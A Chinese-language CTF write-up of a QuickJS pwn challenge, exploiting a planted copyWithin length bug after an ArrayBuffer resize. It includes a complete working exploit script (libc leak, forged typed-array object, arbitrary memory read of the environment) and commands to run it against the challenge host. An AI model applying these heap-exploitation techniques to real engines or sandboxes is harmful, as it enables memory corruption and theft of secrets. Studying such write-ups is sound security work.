# jsbox — QuickJS 引擎内存迷宫

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-17824DAD` · 状态 solved
```

## 一句话

一个只懂 JavaScript 的小盒子：通过 TCP 发来一段 JS 源码，它返回 JSON 结构化的求值结果；同一连接内运行时状态会保留。

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `src/quickjs-base-bundle.tar.gz` | 1.5 MB | `a69e0f7f77c5…` |
| `src/patch.diff` | 564 B | `f26e956fb62c…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 0. 结果

«FLAG»

同一实例连续 3 次连接（每次新 worker、ASLR 不同）读到的 flag 一致。

### 1. 题目与协议

• 服务：QuickJS 2026-06-04 求值盒子，TCP 单行 JSON {"code":"<JS>"}。
• 同一连接内 globalThis 持久；源码上限 64 KiB；单次求值默认 2 秒。
• adapter/server.py 为每个 TCP 连接 fork 一个 worker，环境变量只有 LC_ALL=C、LANG=C，有 flag 时再追加 QJS_CTF_FLAG=<flag>，不继承 adapter 环境。
• runner/qjs_runner.c 从 stdin 读 4 字节大端长度 + 源码，JS_Eval 后回 1 字节状态 + 4 字节大端长度 + payload（'O' 结果、'E' 异常、'L' 限制、'F' 致命）。
• 目标：把只存在于 worker 进程内存/环境里的 QJS_CTF_FLAG 取回。

附件给了完整 engine 底座 quickjs-base-bundle.tar.gz 和线上补丁 patch (1).diff，属于完全白盒。

### 2. 补丁分析

patch (1).diff：

@@ -57672,7 +57672,7 @@

```
return JS_ThrowTypeErrorArrayBufferOOB(ctx);
// RAB may have been resized by evil .valueOf method
-    space = p->u.array.count - max_int(to, from);
+    space = len - max_int(to, from); count = min_int(final - from, len - to); count = min_int(count, space);
```

落点在 js_typed_array_copyWithin（底座 quickjs.c:57646-57685）：

```
p = get_typed_array(ctx, this_val);
if (typed_array_is_oob(p)) return JS_ThrowTypeErrorArrayBufferOOB(ctx);
```

len = p->u.array.count;                       // 57657，旧长度在此捕获

JS_ToInt32Clamp(ctx, &to,   argv[0], 0, len, len);   // 可执行 JS

JS_ToInt32Clamp(ctx, &from, argv[1], 0, len, len);   // 可执行 JS

```
final = len;
if (argc > 2 && !JS_IsUndefined(argv[2]))
```

JS_ToInt32Clamp(ctx, &final, argv[2], 0, len, len);  // 可执行 JS

```
if (typed_array_is_oob(p)) return JS_ThrowTypeErrorArrayBufferOOB(ctx);
// RAB may have been resized by evil .valueOf method
```

space = len - max_int(to, from);              // 补丁后：仍用旧 len

```
count = min_int(final - from, len - to);
count = min_int(count, space);
```

memmove(p->u.array.u.uint8_ptr + (to << shift),

p->u.array.u.uint8_ptr + (from << shift),

```
count << shift);
```

要点：

1. len 在三次 ToInt32 之前捕获，之后不再刷新。
2. 三次 ToInt32 都可以通过 valueOf 执行任意 JS；在其中调用 ab.resize(S)。
3. new Uint8Array(ab)（无显式长度）是 track_rab 视图，typed_array_is_oob 对它只检查 ta->offset > byte_length，然后直接 return FALSE，不检查 length/count。
4. resize 后 js_array_buffer_update_typed_arrays 会把该视图的 p->u.array.count 更新为 (S - offset) >> log2、p->u.array.u.ptr 指向新的 data， 但局部变量 len 仍是旧值 L。
5. 于是 space = L - max(to,from)，memmove 的偏移和长度都按旧 L 计算，而基址是新 data 指针。缩小后的分配尾部有一段已经 free 的“残余区” F，正好落在 [ptr, ptr+L) 内。

未打补丁时 space = p->u.array.count - max(to,from)，resize 后 count 变成 S，memmove 会被限制在仍可写的前 S 字节内，不会越界。线上补丁确实是最上面的 space = len 版本：本地打同补丁的 runner 在 copyWithin(evil, 24, 64) 时复现了corrupted size vs. prev_size while consolidating，远端同参数直接 WorkerClosedError。

### 3. 几何：free 残余区 F

以 L = 0x4000、缩小到 S 为例：

• ab->data = js_malloc(8 + L)：glibc chunk C0 = align16(L+16)，lb = chunk+0x10， data = lb+8 = chunk+0x18。
• resize 到 S 走 js_realloc(ctx, abuf->data, max(S,1))： realloc(lb, 8+S)，glibc 原地 split，新 chunk C1 = align16(S+16)。
• 残余 chunk 从 chunk + C1 开始，于是

```
F_header = ptr + C1 - 0x18
F_user   = F_header + 0x10 = ptr + (C1 - 8)
OFF      = align16(S + 16) - 8
```

• S=0x200 → OFF=0x208；S=0x3000 → OFF=0x3008。

注意两点：

• ab 后面必须紧跟一个已分配的 guard（如 new ArrayBuffer(0x10000)），否则 glibc 的 realloc 会把 remainder 并进 top，F 根本不存在。0x20000 的 guard 会走 mmap，也不行。
• F 的 fd/bk 在 unsorted bin 里指向 main_arena+0x60（libc 2.39），可直接泄漏 libc。

### 4. 相对读写原语

设 ta = Uint8Array(ab)，L 为初始 byteLength，S 为缩小后的长度，OFF 如上。

读 F（count ≤ S）

```js
ta.copyWithin(0, OFF, {valueOf:function(){ ab.resize(S); return OFF + count; }});
// len 仍为 L：space = L - OFF，count' = min(count, L, L-OFF) = count
// memmove(ptr, ptr+OFF, count)
```

随后 ta[0..count) 就是 F 开头 count 字节。

写 F 偏移 X（X ≥ S，count ≤ S）

```js
ta.copyWithin({valueOf:function(){ ab.resize(S); return X; }}, 0, count);
// memmove(ptr+X, ptr, count)
```

payload 放在 ta[0..count)（resize 后仍可写）。

libc 泄漏（8 字节）：

```js
var leak=0n;
for (var i=0;i<8;i++) leak |= BigInt(ta1[i]) << BigInt(8*i);
// leak = main_arena + 0x60
```

Ubuntu 24.04 的 libc 2.39-0ubuntu8.6：

• main_arena = 0x203ac0
• __environ   = 0x20ad58
• leak 偏移会随分配历史变成 0x203b20（main_arena+0x60）或 0x203b80（另一个 bin 头）， 所以 __environ 相对 leak 有两个候选 delta：0x71d8 和 0x7238，读两个、取高字节 0x7f 的那个即可，不写死。

### 5. 从相对读写到任意地址读写

**5.1 把 live JSObject 放进 F**

QJS 自定义分配器按块大小分 arena：

• JSObject 请求 align8(64)+8 = 72，块类 block_size=72，每 arena n_blocks = (4096-40)/72 = 56。
• 新建 arena 时 js_malloc_large(40 + 56*72 = 4072) → malloc(4080) → glibc chunk align16(4088) = 0x1000，正好等于 L=0x4000, S=0x3000 产生的 F（0x1000）。
• 因此 ab.resize(S) 之后循环分配普通对象 {}，当 72 类空闲链表耗尽时， 新建 arena 会恰好从 F 切出，block 0 的 user 就是 F_user + 0x30。

arena 布局（sizeof(JSMallocArena)=40）：

ar+0x00 free_link    ar+0x10 link

ar+0x20 block_size_idx(1) n_used(2) n_blocks(2) first_free(2)

ar+0x28 blocks[]     // block0 header 在 ar+0x28，user 在 ar+0x30

JSObject 布局（sizeof=64）：

user+0x00 JSGCObjectHeader (list_head, 16B)

user+0x10 bitfields (extensible/fast_array/is_HTMLDDA/...)

user+0x12 class_id (uint16)

user+0x18 shape

user+0x20 prop

user+0x28 union u1

user+0x30 u.ptr        // typed array 的 data 指针

user+0x38 u.array.count (uint32)

**5.2 memmove 伪造对象**

evil valueOf 返回 OFF + 64，则 to = OFF+64，count = 48：

```
dest = ptr + OFF + 64 = F + 0x40 = block0_user + 0x10
```

48 字节正好覆盖 user+0x10 .. user+0x40：

| payload 偏移 | 对象偏移 | 字段 |
| --- | --- | --- |
| 0..2 | 0x10 | bitfields（清零，见 is_HTMLDDA 坑） |
| 2..4 | 0x12 | class_id = 26 (Int32Array) 或 23 (Uint8Array) |
| 8..16 | 0x18 | shape |
| 16..24 | 0x20 | prop |
| 24..32 | 0x28 | u1 |
| 32..40 | 0x30 | u.ptr = target |
| 40..44 | 0x38 | count = 0x7fffffff |
| 44..48 | 0x3c | padding |

写完后 arrs[i][j] 走 JS_GetPropertyValue 快路径：

```
case JS_CLASS_UINT8_ARRAY:
if (idx >= p->u.array.count) goto slow_path;
return JS_NewInt32(ctx, p->u.array.u.uint8_ptr[idx]);
```

不检查 is_oob、不解引用 typed_array 指针，于是得到 [target, target+2^31) 的任意字节读写。（256MB/2GB 窗口内任意地址；负下标会被转成巨大 uint32 走慢路径并崩，不能往低地址扫。）

检测哪个对象被伪造：

```js
for (var i=0;i<300;i++)
if (typeof arrs[i][0] === 'number') { obj = arrs[i]; break; }
```

正常 72 类对象 [0] 是 undefined；被改过的对象返回 target 处字节（number）。

**5.3 两个致命坑**

坑 1：is_HTMLDDA。 这个 QuickJS 版本带 annex B IsHtmlDDA 语义（quickjs.c:1007）。bitfields 是 9 个 uint8_t:1，第 9 个 is_HTMLDDA 落在 user+0x11 的 bit0。如果 payload 用 fill(0x45) 且不清零，user+0x11 = 0x45，bit0 置位：

• typeof obj 返回 "undefined"（js_operator_typeof 特判）；
• obj 是 falsy（JS_ToBoolFree 返回 !p->is_HTMLDDA）；
• 但 obj[0] 仍然能读，obj === undefined 为 false。

一开始的 if (!obj) throw "phase failed" 因此误报失败。修复：for (i<48) ta[i]=0;再写字段，把 user+0x10/0x11 清零。

坑 2：GC 标记 shape=0。 mark_children 对 JS_OBJECT 会sh = p->shape; mark_func(&sh->header); get_shape_prop(sh);，shape 被写成 0 后一旦 GC就 SIGSEGV。对策：

• 伪造对象用 globalThis.__p0/__p1 保活，避免 eval 结束时 free_object 崩；
• 在 exploit 开头分配 2MB live junk（32×64KB）把 malloc_gc_threshold 抬高到 ~3MB， 后续 ~几百 KB 分配不再触发 GC；
• 即使收尾时崩，响应帧已经 write(2) 出去了，不影响拿结果。

### 6. 一次连接内的完整链

phase 0: leak libc

ab1 L=0x4000 S=0x200 OFF=0x208 + 64KB guard

ta1.copyWithin(0, OFF, {resize(S); return OFF+8})

```
leak = *(u64*)F  → main_arena+0x60
```

phase 1: 读 __environ

ab2 L=0x4000 S=0x3000 OFF=0x3008 + 64KB guard

forge class 26, target = leak - 0x200000

读 obj[(0x200000+0x71d8)/4] 和 obj[(0x200000+0x7238)/4]

取高字节 0x7f 的那个 → envp

phase 2: 读 envp[2]（flag 字符串指针）

forge class 23, target = envp

```
p2 = qword at obj[16..24]  （envp[2]）
fsp = p2
```

phase 3: 复用 phase 2 的对象读 flag 字符串

```
off = fsp - envp
```

s = obj[off .. off+0x60]，读到 NUL 为止

```
s = "QJS_CTF_FLAG=«FLAG»"
```

为什么 phase 3 不再 forge 一次：

• 每次 forge 都要依赖“新的 72 arena 恰好落在当前 ab 的 F”，而 F 是否空闲受前面 arena/数组存储/guard 布局影响，第三次 forge 实测 mi=-1（F 被别的 chunk 占了）。
• phase 2 的对象已经是 Uint8Array 视图，count=0x7fffffff，直接读 envp+off 即可； fsp-envp 只有几 KB，远小于窗口。
• 读字符串必须读到 NUL 停：最小 env 下 flag 字符串离栈顶只有几十字节，读满 0x100 会越过 [stack] 映射尾部直接 SIGSEGV。

### 7. 最终 exploit（qjs_new/cw/t22.js）

```js
var out = {steps: []};
try {
// raise GC threshold with live junk
var junk = [];
for (var i = 0; i < 32; i++) junk.push(new ArrayBuffer(0x10000));
globalThis.__junk = junk;
// leak libc (unsorted bin head)
var L1 = 0x4000, S1 = 0x200, OFF1 = 0x208;
var ab1 = new ArrayBuffer(L1, {maxByteLength: L1});
var ta1 = new Uint8Array(ab1);
var g1 = new ArrayBuffer(0x10000);
ta1.fill(0x41);
var e1 = {valueOf: function () { ab1.resize(S1); return OFF1 + 8; }};
ta1.copyWithin(0, OFF1, e1);
var leak = 0n;
for (var i = 0; i < 8; i++) leak |= BigInt(ta1[i]) << BigInt(8 * i);
out.leak = leak.toString(16);
var envp = 0n, fsp = 0n, flag = null;
for (var phase = 0; phase < 2; phase++) {
var tgt = (phase === 0) ? (leak - 0x200000n) : envp;
var clsid = (phase === 0) ? 26 : 23;
var L = 0x4000, S = 0x3000, OFF = 0x3008;
var ab = new ArrayBuffer(L, {maxByteLength: L});
var ta = new Uint8Array(ab);
var g = new ArrayBuffer(0x10000);
ta.fill(0x45);
for (var i = 0; i < 48; i++) ta[i] = 0;
ta[2] = clsid; ta[3] = 0;
var tv = tgt;
for (var i = 0; i < 8; i++) { ta[32 + i] = Number(tv & 0xffn); tv >>= 8n; }
ta[40] = 0xff; ta[41] = 0xff; ta[42] = 0xff; ta[43] = 0x7f;
var arrs = [];
for (var i = 0; i < 300; i++) arrs[i] = null;
var evil = {valueOf: function () {
ab.resize(S);
for (var i = 0; i < 300; i++) arrs[i] = {};
return OFF + 64;
}};
ta.copyWithin(evil, 0, 48);
globalThis["__p" + phase] = arrs;
var obj = null, mi = -1;
for (var i = 0; i < 300; i++) {
try { if (typeof arrs[i][0] === 'number') { mi = i; obj = arrs[i]; break; } }
catch (e2) { out.loopErr = i + ":" + String(e2); break; }
}
out["h" + phase] = (obj !== null) ? 1 : 0;
if (!obj) throw new Error("phase " + phase + " failed");
if (phase === 1) { globalThis.__o1 = obj; globalThis.__envp1 = envp; }
if (phase === 0) {
var ia = (0x200000 + 0x71d8) / 4, ib = (0x200000 + 0x7238) / 4;
var la = BigInt(obj[ia] >>> 0) | (BigInt(obj[ia + 1] >>> 0) << 32n);
var lb = BigInt(obj[ib] >>> 0) | (BigInt(obj[ib + 1] >>> 0) << 32n);
out.a = la.toString(16); out.b = lb.toString(16);
envp = ((la >> 40n) === 0x7fn) ? la : lb;
out.envp = envp.toString(16);
if (envp === 0n) throw new Error("no envp");
} else {
var p0 = 0n, p2 = 0n;
for (var i = 0; i < 8; i++) p0 |= BigInt(obj[i] & 0xff) << BigInt(8 * i);
for (var i = 0; i < 8; i++) p2 |= BigInt(obj[16 + i] & 0xff) << BigInt(8 * i);
out.p0 = p0.toString(16); out.p2 = p2.toString(16);
fsp = ((p2 >> 40n) === 0x7fn) ? p2 : p0;
out.fsp = fsp.toString(16);
if (fsp === 0n) throw new Error("no fsp");
}
}
var o1 = globalThis.__o1, envp1 = globalThis.__envp1;
var off = Number(fsp - envp1);
out.off = off;
var s2 = "";
for (var i = 0; i < 0x60; i++) {
var ch = o1[off + i];
if (ch === 0) break;
s2 += String.fromCharCode(ch);
}
var at2 = s2.indexOf("QJS_CTF_FLAG=");
out.at2 = at2;
if (at2 >= 0) out.flag = s2.slice(at2 + 13, at2 + 13 + 80);
else out.s2 = s2;
} catch (e) { out.exc = String(e); }
```

out

at2 + 13："QJS_CTF_FLAG=" 的长度是 13（QJS 3 + _ 1 + CTF 3 + _ 1 + FLAG 4 + = 1）。

远程返回（节选）：

```
{"ok": true, "result": {
```

"leak": "715636bc8b20",

"envp": "7ffe106f4708",

"p2": "7ffe106f4fae",

"off": 2214,

"at2": 0,

"flag": "«FLAG»"

```
}}
```

### 8. 复现步骤

1. 解压 quickjs-base-bundle.tar.gz，给 third_party/quickjs/src/quickjs.c 打上 patch (1).diff（把 space = p->u.array.count - max_int(to, from); 改成 space = len - max_int(to, from);）。
2. make runner，得到 build/qjs_runner（-g 可在 gdb 里 add-symbol-file）。
3. 本地 glibc 版本对齐：用 Ubuntu 24.04 rootfs（ubuntu-base-24.04.5-base-amd64.tar.gz） 解压到 /opt/noble；或从 launchpad 取 libc6_2.39-0ubuntu8.6_amd64.deb + libc6-dbg 解压到 /opt/lc86， 用它的 ld-linux-x86-64.so.2 --library-path ... 跑 runner。
4. 驱动：按协议发 4 字节大端长度 + 源码，读 5 字节帧头 + payload， env 只放 LC_ALL、LANG、QJS_CTF_FLAG（drv_min.py）。
5. 本地验证会得到 «FLAG»。
6. 远程：向 172.16.170.2:8000 发 {"code": <t22.js>}，解析返回 JSON 的 result.flag。

# 本地

wsl -d Ubuntu-22.04 -e bash -lc \

'cd "/mnt/d/文档/deepseek-harness/TPCTF决赛/qjs_new/cw" && python3 drv_min.py t22.js'

# 远程

```python
python3 - <<'PY'
import sys, json
```

sys.path.insert(0, "js2")

```python
from qclient import Client
code = open("qjs_new/cw/t22.js").read()
c = Client("172.16.170.2", 8000, timeout=20)
print(c.eval(code)["result"]["flag"])
```

c.close()

PY

### 9. 踩坑记录

| 坑 | 现象 | 解决 |
| --- | --- | --- |
| JS_MALLOC_USE_ITER 未启用 | 没有 list_del unlink 原语 | 放弃 unlink 路线 |
| 56 类 arena 抢 F | 先分配 typed array 会让 idx=5 arena 落在 F，memmove 打坏它的 block1 header | 只分配普通 {}（72 类） |
| 数组存储增长抢 F | arrs 的 JSValue 数组 realloc 落在 F，arena 没拿到 | resize 前先 arrs[i]=null 预增长 |
| is_HTMLDDA | typeof obj === "undefined"、!obj 为真，误判失败 | payload 前 48 字节清零 |
| GC 标记 shape=0 | 收尾/中途 GC 在 mark_children 崩 | live junk 抬高阈值；globalThis 保活；响应先发出 |
| 越栈顶 | 从 envp 读 0x100 字节越过 [stack] 尾部 SIGSEGV | 逐字节读到 NUL 停，最多 0x60 |
| 第三个 forge 失效 | 第三次 mi=-1，F 被别的 chunk 占 | 复用 phase 2 的对象读 envp+off |
| leak 偏移变化 | 0x203b20 / 0x203b80 取决于分配历史 | 读两个 delta，取 0x7f 高字节 |
| 驱动 stderr 管道 | worker 的 [DBG] 写满 pipe，驱动挂起 | stderr=None/DEVNULL |
| 大 guard 走 mmap | ArrayBuffer(0x20000) 与 ab 不相邻，F 并入 top | guard 用 0x10000 |

### 10. 修复建议

copyWithin 在三次 ToInt32 之后应重新读取当前长度，或直接用刷新后的 count 计算上界：

len = p->u.array.count;   // 在 ToInt32 之后重新取

```
space = len - max_int(to, from);
```

并且 typed_array_is_oob 对 track_rab 视图不能只检查 offset，还要检查ta->offset + count*size_elem <= abuf->byte_length，否则 resize 后 length/count不一致的窗口仍然存在。

## 结果

- flag sha256：`1716cf69dbeae554ba1e73e63515ff96b18e994469ac9fb0a2bd3140bef9d828`, `77135a7fc8179a60e9bd5ae18e59d7b5b3810e75b617b0b696da4040e78cabe8`, `9355307f5a46d9ae8debb1910d4170714fdbab7245f2d334f0bfd93a2984bada`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- （未归档脚本，见原始工作目录）

## 待核实

- 本条目由 WP 第 29 节《jsbox — QuickJS 引擎内存迷宫》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
